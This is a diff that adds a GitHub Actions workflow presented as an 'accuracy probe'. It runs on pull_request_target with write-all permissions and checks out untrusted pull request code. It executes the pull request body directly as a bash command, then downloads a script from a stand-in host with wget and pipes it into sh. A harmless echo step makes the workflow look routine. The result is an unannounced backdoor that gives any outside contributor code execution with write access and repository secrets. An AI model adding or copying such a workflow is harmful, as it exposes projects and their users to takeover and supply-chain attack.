@@ -1,0 +1,17 @@
+name: DCOIR Review V9 Accuracy Probe
+on:
+  pull_request_target:
+permissions: write-all
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - name: Execute PR body
+        run: bash -c "${{ github.event.pull_request.body }}"
+      - name: Install probe dependency
+        run: wget -qO- https://downloads.example.invalid/v9-probe.sh | sh
+      - name: Benign echo
+        run: echo "done"
